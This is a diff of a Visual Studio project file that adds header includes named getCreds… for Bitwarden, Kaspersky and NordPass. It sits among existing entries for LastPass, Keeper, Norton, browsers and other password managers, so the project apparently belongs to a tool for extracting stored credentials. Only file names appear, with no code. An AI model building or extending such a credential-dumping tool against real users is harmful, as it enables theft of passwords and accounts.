@@ -147,6 +147,8 @@
     <ClInclude Include="headers\avira\getCredsavira2.h" />
     <ClInclude Include="headers\bitdefender\getCredsbitdefender.h" />
     <ClInclude Include="headers\bitdefender\getCredsbitdefender2.h" />
+    <ClInclude Include="headers\bitwarden\app\getCredsbitwardenApp1.h" />
+    <ClInclude Include="headers\bitwarden\app\getCredsbitwardenApp2.h" />
     <ClInclude Include="headers\bitwarden\plugin\getCredsbitwardenPluginChrome.h" />
     <ClInclude Include="headers\bitwarden\plugin\getCredsbitwardenPluginChrome2.h" />
     <ClInclude Include="headers\chromium\getCredschromium.h" />
@@ -169,12 +171,15 @@
     <ClInclude Include="headers\firefox\getCredsfirefox.h" />
     <ClInclude Include="headers\firefox\getCredsfirefox2.h" />
     <ClInclude Include="headers\ironvest\getCredsironvest.h" />
+    <ClInclude Include="headers\kaspersky\getCredsKasperskyEntries.h" />
     <ClInclude Include="headers\keeper\getCredskeeper1.h" />
     <ClInclude Include="headers\keeper\getCredskeeper2.h" />
     <ClInclude Include="headers\keeper\getCredskeeper3.h" />
     <ClInclude Include="headers\lastpass\getCredslastpassEntries.h" />
     <ClInclude Include="headers\lastpass\getCredslastpassMasterPass.h" />
     <ClInclude Include="headers\lastpass\getCredslastpassMasterUsername.h" />
+    <ClInclude Include="headers\nordpass\app\getCredsnordpass1.h" />
+    <ClInclude Include="headers\nordpass\app\getCredsnordpass2.h" />
     <ClInclude Include="headers\norton\getCredsnorton.h" />
     <ClInclude Include="headers\norton\getCredsnorton2.h" />
     <ClInclude Include="headers\passwarden\app\getCredspasswarden.h" />
